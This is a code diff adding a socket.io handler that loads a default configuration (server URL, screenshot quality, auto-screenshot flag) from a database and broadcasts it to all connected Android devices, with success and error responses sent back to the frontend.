@@ -663,6 +663,34 @@ frontendIo.on("connection", async (socket) => {
         }
     });
 
+    socket.on("broadcast_default_config", async () => {
+        try {
+            console.log(chalk.cyan(`[i] Broadcast default config request received from frontend ${socket.id}`));
+            
+            // Get default config from database
+            const defaultConfig = await db.getDefaultConfig();
+            if (!defaultConfig) {
+                socket.emit("default_config_error", { error: 'Default config not found' });
+                return;
+            }
+            
+            const configToSend = {
+                server_url: defaultConfig.server_url,
+                screenshot_quality: defaultConfig.screenshot_quality,
+                auto_screenshot: defaultConfig.auto_screenshot === 1
+            };
+            
+            // Broadcast to all connected Android devices
+            androidIo.emit("config_data", configToSend);
+            
+            console.log(chalk.green(`[+] Default config broadcasted to all Android devices`));
+            socket.emit("default_config_broadcasted", { success: true });
+        } catch (error) {
+            console.error('Error broadcasting default config:', error);
+            socket.emit("default_config_error", { error: error.message });
+        }
+    });
+
     // Device config events
     socket.on("get_device_config", async (deviceUuid) => {
         try {
